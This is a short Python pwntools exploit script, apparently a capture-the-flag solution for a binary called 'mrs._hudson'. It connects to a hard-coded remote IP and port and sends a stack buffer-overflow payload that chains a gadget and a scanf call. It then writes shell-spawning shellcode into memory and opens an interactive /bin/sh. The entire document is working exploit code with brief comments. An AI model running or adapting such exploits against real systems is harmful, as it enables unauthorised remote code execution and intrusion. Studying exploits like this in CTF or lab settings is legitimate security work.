#First import pwntools
from pwn import *

#Establish the target, and the context so the shellcode can be written
#target = process('./mrs._hudson')
target = remote('178.62.249.106', 8642)
context.binary = ELF('mrs._hudson')

#Read the first line of text
print target.recvline()

#Establish the address needed
scanf  = 0x40066f
memory = 0x601000
gadget = 0x400575

#gdb.attach(target)

#Establish the first payload, and send it
payload0 = "0"*120 + p64(gadget) + p64(memory + 0x70) + p64(scanf)
target.sendline(payload0)

#Establish the second payload, write the shellcode, and send it
payload1 = fit({0x0: asm(shellcraft.sh()), 0x78: p64(memory)})
target.sendline(payload1)

#Drop to an interactive shell, and enjoy /bin/sh
target.interactive()